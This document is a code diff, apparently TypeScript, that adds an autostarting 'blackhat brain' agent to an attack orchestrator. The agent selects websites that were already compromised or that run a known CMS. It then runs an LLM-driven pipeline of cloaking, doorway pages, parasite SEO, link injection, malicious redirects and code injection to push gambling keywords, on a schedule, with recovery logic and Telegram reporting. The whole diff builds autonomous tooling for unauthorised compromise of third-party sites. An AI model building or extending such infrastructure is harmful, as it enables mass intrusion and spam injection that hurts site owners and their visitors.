@@ -33,6 +33,7 @@ import { startSuccessRateMonitor, stopSuccessRateMonitor } from "./success-rate-
 import { detectCms } from "./cms-vuln-scanner";
 import { getCmsAttackProfile } from "./adaptive-learning";
 import { getWafTargetingRecommendation, selectBypassTechniques, type WafTargetingResult } from "./waf-bypass-strategies";
+import { runAgenticBlackhatBrain, type BlackhatBrainConfig } from "./agentic-blackhat-brain";
 import { getDb } from "./db";
 import { agenticSessions, seoProjects, serpDiscoveredTargets, cmsAttackProfiles } from "../drizzle/schema";
 import { eq, and, sql, desc, inArray, isNull, isNotNull, ne } from "drizzle-orm";
@@ -68,7 +69,7 @@ export interface OrchestratorState {
   successfulRecoveries: number;
 }
 
-type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "keyword_discovery" | "gambling_brain" | "cms_scan";
+type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "keyword_discovery" | "gambling_brain" | "cms_scan" | "blackhat_brain";
 
 // ═══════════════════════════════════════════════
 //  DEFAULT AGENT CONFIGS
@@ -109,6 +110,10 @@ const DEFAULT_AGENTS: Record<AgentName, AgentConfig> = {
   },
   cms_scan: {
     enabled: true, intervalMs: 2 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
+  },
+  blackhat_brain: {
+    enabled: true, intervalMs: 3 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
     consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
 };
@@ -709,6 +714,111 @@ async function executeCmsScanTask(task: DaemonTask, signal: AbortSignal): Promis
   }
 }
 
+/**
+ * Blackhat Brain Executor — LLM-driven autonomous blackhat operations
+ * Finds targets with known vulnerabilities/shells and runs full blackhat AI pipeline
+ */
+async function executeBlackhatBrainTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
+  try {
+    const db = await getDb();
+    if (!db) return { success: false, error: "Database not available" };
+
+    // Find targets that have been successfully attacked (have deployed redirects)
+    const successTargets = await db.select({
+      id: agenticSessions.id,
+      targetDomain: agenticSessions.currentTarget,
+      targetsSucceeded: agenticSessions.targetsSucceeded,
+      status: agenticSessions.status,
+      targetCms: agenticSessions.targetCms,
+    })
+      .from(agenticSessions)
+      .where(
+        and(
+          eq(agenticSessions.status, "completed"),
+          sql`${agenticSessions.targetsSucceeded} > 0`,
+        )
+      )
+      .orderBy(desc(agenticSessions.createdAt))
+      .limit(10);
+
+    // Also find discovered targets with known CMS for fresh attacks
+    const cmsTargets = await db.select({
+      id: serpDiscoveredTargets.id,
+      domain: serpDiscoveredTargets.domain,
+      url: serpDiscoveredTargets.url,
+      cms: serpDiscoveredTargets.cms,
+    })
+      .from(serpDiscoveredTargets)
+      .where(
+        and(
+          isNotNull(serpDiscoveredTargets.cms),
+          ne(serpDiscoveredTargets.cms, "unknown"),
+          eq(serpDiscoveredTargets.status, "discovered"),
+        )
+      )
+      .orderBy(sql`RAND()`)
+      .limit(5);
+
+    // Pick the best target for blackhat brain
+    let targetDomain: string | null = null;
+    let targetCms: string | undefined;
+
+    if (successTargets.length > 0) {
+      // Prioritize targets with existing shells for post-exploitation
+      const target = successTargets[Math.floor(Math.random() * successTargets.length)];
+      targetDomain = target.targetDomain;
+    } else if (cmsTargets.length > 0) {
+      // Fall back to CMS targets for fresh attacks
+      const target = cmsTargets[Math.floor(Math.random() * cmsTargets.length)];
+      targetDomain = target.domain;
+      targetCms = target.cms || undefined;
+    }
+
+    if (!targetDomain) {
+      return { success: true, result: { message: "No suitable targets for blackhat brain", skipped: true } };
+    }
+
+    const keywords = (task.config?.keywords as string[]) || ["casino", "slot", "betting", "gambling"];
+
+    const aggressivenessMap: Record<string, number> = { low: 3, medium: 5, high: 7, maximum: 10 };
+    const aggrLevel = (task.config?.aggressiveness as string) || "high";
+
+    const brainConfig: BlackhatBrainConfig = {
+      targetDomain,
+      targetUrl: `https://${targetDomain}`,
+      redirectUrl: (task.config?.redirectUrl as string) || "https://example.com",
+      seoKeywords: keywords,
+      userId: 1,
+      aggressiveness: aggressivenessMap[aggrLevel] || 7,
+      maxTechniques: (task.config?.maxTechniques as number) || 8,
+      targetProfile: targetCms ? { cms: targetCms } : undefined,
+      enabledCategories: ["cloaking", "doorway", "parasite", "link_injection", "redirect", "content_manip", "code_injection"],
+      signal,
+    };
+
+    console.log(`[Orchestrator] 🧠 Starting Blackhat Brain for ${targetDomain} (CMS: ${targetCms || "unknown"}, aggression: ${brainConfig.aggressiveness})`);
+
+    const result = await runAgenticBlackhatBrain(brainConfig);
+
+    return {
+      success: result.successfulTechniques > 0,
+      result: {
+        sessionId: result.sessionId,
+        targetDomain: result.targetDomain,
+        totalTechniques: result.totalTechniques,
+        successfulTechniques: result.successfulTechniques,
+        failedTechniques: result.failedTechniques,
+        aiStrategy: result.aiStrategy,
+        telegramSent: result.telegramSent,
+        durationMs: result.totalDurationMs,
+        message: `Blackhat Brain: ${result.successfulTechniques}/${result.totalTechniques} techniques succeeded on ${targetDomain}`,
+      },
+    };
+  } catch (err: any) {
+    return { success: false, error: err.message };
+  }
+}
+
 // ═══════════════════════════════════════════════
 //  ORCHESTRATOR TICK — Main loop
 // ═══════════════════════════════════════════════
@@ -752,6 +862,7 @@ async function orchestratorTick() {
         keyword_discovery: "keyword_discovery",
         gambling_brain: "gambling_brain_cycle",
         cms_scan: "cms_scan",
+        blackhat_brain: "blackhat_brain",
       };
 
       const taskId = await enqueueTask({
@@ -806,6 +917,7 @@ export function startOrchestrator(customAgents?: Partial<Record<AgentName, Parti
   registerExecutor("keyword_discovery", executeKeywordDiscoveryTask);
   registerExecutor("gambling_brain_cycle", executeGamblingBrainTask);
   registerExecutor("cms_scan", executeCmsScanTask);
+  registerExecutor("blackhat_brain", executeBlackhatBrainTask);
 
   // Set initial next-run times (stagger to avoid thundering herd)
   const now = Date.now();
@@ -1104,6 +1216,23 @@ const RECOVERY_STRATEGIES: Record<AgentName, RecoveryStrategy[]> = {
       apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; config.maxConcurrent = 1; },
     },
   ],
+  blackhat_brain: [
+    {
+      name: "reduce_aggressiveness",
+      description: "Reduce aggressiveness and max techniques",
+      apply: (_name, config) => { config.intervalMs = Math.max(config.intervalMs, 4 * 60 * 60_000); },
+    },
+    {
+      name: "increase_interval",
+      description: "Increase interval to 6 hours",
+      apply: (_name, config) => { config.intervalMs = 6 * 60 * 60_000; },
+    },
+    {
+      name: "minimal_mode",
+      description: "Minimal blackhat brain with 12h interval",
+      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
+    },
+  ],
 };
 
 /**
@@ -1188,9 +1317,9 @@ const TASK_TYPE_TO_AGENT: Record<string, AgentName> = {
   cve_update: "cve",
   keyword_discovery: "keyword_discovery",
   gambling_brain_cycle: "gambling_brain",
-  cms_scan: "cms_scan",
+   cms_scan: "cms_scan",
+  blackhat_brain: "blackhat_brain",
 };
-
 const FAILURE_ALERT_THRESHOLD = 3;
 const failureAlertsSent = new Set<string>(); // Track which agents already sent failure alerts
 
